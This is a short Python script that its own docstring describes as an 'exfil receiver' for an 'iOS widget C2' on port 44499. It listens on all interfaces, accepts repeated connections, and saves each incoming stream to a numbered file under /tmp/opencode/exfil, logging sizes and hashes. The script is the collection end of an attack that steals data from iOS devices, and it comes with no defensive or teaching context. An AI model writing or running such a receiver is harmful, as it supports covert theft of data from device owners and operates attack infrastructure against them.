#!/usr/bin/env python3
"""Resilient exfil receiver for the iOS widget C2 (port 44499).

Loops forever: accepts connections one at a time, saves each to a
timestamped file, and keeps listening (so repeated widget runs all land).
"""
import hashlib
import socket
import sys
import time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 44499
OUT = sys.argv[2] if len(sys.argv) > 2 else "/tmp/opencode/exfil"

srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", PORT))
srv.listen(8)
srv.settimeout(5.0)
print("LISTEN %d (loop)" % PORT, flush=True)
n = 0
while True:
    try:
        conn, addr = srv.accept()
    except socket.timeout:
        continue
    except OSError as e:
        print("ERR %s" % e, flush=True)
        time.sleep(2)
        continue
    n += 1
    path = "%s_%d" % (OUT, n)
    print("CONN %d %s:%d -> %s" % (n, addr[0], addr[1], path), flush=True)
    h = hashlib.sha256()
    got = 0
    t0 = time.time()
    conn.settimeout(15.0)
    with open(path, "wb") as f:
        while True:
            try:
                d = conn.recv(1 << 20)
            except socket.timeout:
                break
            if not d:
                break
            f.write(d)
            h.update(d)
            got += len(d)
    print("GOT %d %d bytes sha=%s %.1fs" % (n, got, h.hexdigest(), time.time() - t0), flush=True)
    conn.close()
